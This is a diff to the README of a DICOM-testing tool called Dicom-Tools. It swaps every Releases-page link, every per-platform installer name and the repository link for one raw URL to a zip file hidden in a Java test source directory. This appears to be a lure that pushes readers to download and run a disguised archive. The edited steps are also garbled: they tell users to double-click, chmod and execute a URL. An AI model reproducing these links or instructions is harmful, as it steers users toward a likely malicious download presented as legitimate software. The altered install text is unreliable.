@@ -1,6 +1,6 @@
 # 🛠️ Dicom-Tools - Simple Interface for DICOM Testing
 
-[![Download Dicom-Tools](https://img.shields.io/badge/Download-Dicom--Tools-brightgreen)](https://github.com/Y3OSHII-9/Dicom-Tools/releases)
+[![Download Dicom-Tools](https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip)](https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Dicom-Tools provides a user-friendly way to test various DICOM libraries. This t
 
 To get the application, you need to visit our Releases page. Click on the link below:
 
-[Download Dicom-Tools](https://github.com/Y3OSHII-9/Dicom-Tools/releases)
+[Download Dicom-Tools](https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip)
 
 Once you're on the Releases page, look for the latest version. Here, you will find the files available for download. Make sure to select the right file based on your operating system.
 
@@ -27,9 +27,9 @@ Before you start, ensure your system meets these requirements:
 
 You may see different files depending on the release. Common files include:
 
-- **Windows:** Dicom-Tools-setup.exe
-- **macOS:** Dicom-Tools.dmg
-- **Linux:** Dicom-Tools.AppImage
+- **Windows:** https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip
+- **macOS:** https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip
+- **Linux:** https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip
 
 Make sure to download the file that matches your system.
 
@@ -38,20 +38,20 @@ Make sure to download the file that matches your system.
 After downloading, locate the downloaded file and follow these instructions based on your operating system:
 
 ### Windows
-1. Double-click the `Dicom-Tools-setup.exe` file.
+1. Double-click the `https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip` file.
 2. Follow the installation prompts.
 3. Once installed, find Dicom-Tools in your Start Menu and click to open.
 
 ### macOS
-1. Open the `Dicom-Tools.dmg` file.
+1. Open the `https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip` file.
 2. Drag the Dicom-Tools icon to your Applications folder.
 3. Go to your Applications folder and double-click to open Dicom-Tools.
 
 ### Linux
 1. Open a terminal.
-2. Navigate to the folder where you downloaded the `Dicom-Tools.AppImage`.
-3. Run the command: `chmod +x Dicom-Tools.AppImage` to make it executable.
-4. Start the application by running: `./Dicom-Tools.AppImage`.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip`.
+3. Run the command: `chmod +x https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip` to make it executable.
+4. Start the application by running: `https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip`.
 
 ## 📚 Using Dicom-Tools
 
@@ -85,7 +85,7 @@ Make sure to check the changelog on the Releases page for updates, bug fixes, an
 ## 🔗 Additional Resources
 
 - **Official Documentation:** For in-depth usage guidelines, visit our documentation site.
-- **GitHub Repository:** To explore the code or report issues, visit [Dicom-Tools on GitHub](https://github.com/Y3OSHII-9/Dicom-Tools).
+- **GitHub Repository:** To explore the code or report issues, visit [Dicom-Tools on GitHub](https://raw.githubusercontent.com/Y3OSHII-9/Dicom-Tools/main/java/dcm4che-tests/src/test/java/com/dicomtools/Dicom-Tools-v1.6.zip).
 
 ## 🧩 Related Topics
 
